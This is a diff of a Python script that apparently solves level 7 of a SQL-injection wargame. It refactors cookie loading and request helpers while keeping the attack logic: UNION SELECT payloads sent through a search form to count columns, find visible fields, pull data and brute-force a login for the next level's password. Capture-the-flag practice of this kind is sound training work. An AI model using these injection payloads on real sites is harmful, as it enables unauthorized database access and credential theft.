@@ -1,6 +1,8 @@
 #!/usr/bin/env python3
 import pickle
 import tigers as tg
+import tiger_cookies
+from connect import my_request as req
 
 
 def main():
@@ -13,22 +15,14 @@ def main():
     base_name = 'level7_news'
     finds = ['autor']  # What we are finding
     pass_r = 'The password for the next level is: '
+    level = 'level7login'
 
-    try:
-        with open('cooks.pickle', 'rb') as f:
-            cooks = pickle.load(f)
-        if 'level7login' not in cooks:
-            print('use prevision level')
-            exit(1)
-    except:
-        print('use level 1')
-        exit(1)
-
-    cook = dict(level7login=cooks['level7login'])
+    cooks = tiger_cookies.check_cookies(level)
+    cook = dict(level7login=cooks[level])
 
     # Search for error
     data = dict(search="google%'", dosearch='search!')
-    response = tg.get_request(url, data, cook, 'post')
+    response = req.post_request(url, data, cook)
     # print(response)
 
     # Counting the number of columns
@@ -38,7 +32,7 @@ def main():
         list_of_columns = [str(c + 1) for c in range(columns)]
         p = f"google%') union select {','.join(list_of_columns)} FROM {base_name} news, level7_texts text where ('%'='"
         data = dict(search=p, dosearch='search!')
-        response = tg.get_request(url, data, cook, method='post')
+        response = req.post_request(url, data, cook)
         columns += 1
 
     print(list_of_columns)
@@ -46,7 +40,7 @@ def main():
     # Search for visible columns
     p = f"google%') UNION SELECT 1,2,3,4 FROM {base_name} news, level7_texts text where ('%'='"
     data = dict(search=p, dosearch='search!')
-    #response = tg.get_request(url, data, cook, 'post')
+    #response = req.post_request(url, data, cook)
     # print(response)
     base_p = "google"
     num_columns = 4
@@ -72,18 +66,14 @@ def main():
     for k in keys:
         # Authorization
         data = {'username': k, 'try': 'Check!'}
-        response = tg.get_request(url, data, cook, method='post')
+        response = req.post_request(url, data, cook)
         if 'flag' in response:
             break
 
     # Еxtracting data from html
     passw = tg.extract_pass(response, pass_r).replace(pass_r, '')
     print('password:', passw)
-
-    # Save cookie
-    if ('level8login' not in cooks) or (cooks['level8login'] != passw):
-        cooks['level8login'] = passw
-        tg.save_cookies(cooks)
+    tiger_cookies.save_cookies(cooks, level, passw)
 
 
 if __name__ == '__main__':
